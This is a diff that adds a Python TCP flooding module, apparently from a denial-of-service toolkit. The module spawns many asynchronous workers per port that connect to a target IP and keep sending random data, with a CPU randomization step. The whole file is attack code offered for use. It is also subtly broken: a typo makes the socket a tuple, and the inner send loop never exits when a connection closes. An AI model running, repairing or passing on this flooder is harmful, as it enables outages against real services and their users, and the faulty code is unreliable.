@@ -1,0 +1,127 @@
+from ..utils.ulog import log
+import asyncio
+from typing import List, Optional, Tuple
+import socket
+from concurrent.futures import ThreadPoolExecutor
+import multiprocessing
+import os
+from contextlib import suppress
+
+from ..src.cpu_manager import CPUManager
+
+SOCK_BUFF_SIZE = 1024 * 1024
+MAX_HTTP_PACKET_SIZE = 16 * 1024 * 1024
+DEFAULT_CONCURRENT_WORKERS = multiprocessing.cpu_count()
+
+
+class TCPFlooder:
+    def __init__(
+            self,
+            targget_ip: str,
+            ports: List[int],
+            concurrency: int,
+    ):
+        
+        self.target_ip = targget_ip
+        self.ports = ports
+        self.concurrency = concurrency
+
+
+    async def tcp_flood_worker(
+            self,
+            port: int,
+            worker_id: int
+    ) -> None:
+        pid = os.getpid()
+        log.info(f"[Worker {worker_id} | PID {pid}] Starting TCP flood on port {port}...")
+
+
+        while True:
+            try:
+                sock = socket,socket(
+                    socket.AF_INET,
+                    socket.SOCK_STREAM,
+                )
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCK_BUFF_SIZE)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCK_BUFF_SIZE)
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+
+                loop = asyncio.get_event_loop()
+
+
+                await asyncio.wait_for(
+                    loop.sock_connect(
+                        sock,
+                        (self.target_ip, port)
+                    ),
+                    timeout=5.0
+                )
+                log.info(f"[TCP Worker {worker_id}] Connected to {self.target_ip}:{port}")
+                while True:
+                    try:
+                        await loop.sock_sendall(
+                            sock,
+                            os.urandom(1024)
+                        )
+                        await asyncio.sleep(0.01)
+                        log.debug(f"[TCP Worker {worker_id}] Sent packet to {self.target_ip}:{port}")
+                    except (ConnectionError, BrokenPipeError, OSError):
+                        log.debug(f"[TCP Worker {worker_id}] Connection closed by target {self.target_ip}:{port}")
+
+            except asyncio.TimeoutError:
+                log.debug(f"[TCP Worker {worker_id}] Timeout to connect {self.target_ip}:{port}")
+            except asyncio.CancelledError:
+                log.info(f"[TCP Worker {worker_id}] Cancell task.")
+                break
+            except Exception as e:
+                log.debug(f"[TCP Worker {worker_id}] Error: {e}")
+                await asyncio.sleep(0.1)
+            finally:
+                try:
+                    sock.close()
+                except:
+                    pass
+
+
+        
+    async def start_tcp_flood(self) -> None:
+        tasks = []
+
+        ports_count = len(self.ports)
+        workers_per_port = max(1, self.concurrency // max(1, ports_count))
+
+
+        for port in self.ports:
+            for i in range(workers_per_port):
+                worker_id = len(tasks) 
+                task = asyncio.create_task(
+                    self.tcp_flood_worker(port, worker_id),
+                    name=f"tcp_worker_{port}_{i}"
+                )
+                tasks.append(task)
+        try:
+            await asyncio.gather(*tasks, return_exceptions=True)
+        except KeyboardInterrupt:
+            log.info("TCP flood interrupted by user.")
+            for task in tasks:
+                task.cancel()
+            
+            with suppress(asyncio.CancelledError):
+                await asyncio.gather(*tasks, return_exceptions=True)
+    
+
+async def run_tcp_flood(
+        target_ip: str,
+        ports: List[int],
+        concurrency: int
+) -> None:
+    log.warning(f"Starting TCP flood on {target_ip} ports {ports} with {concurrency} workers.")
+
+    CPUManager.randomize_cpu()
+
+
+    flooder = TCPFlooder(target_ip, ports, concurrency)
+    await flooder.start_tcp_flood()
+
+
+
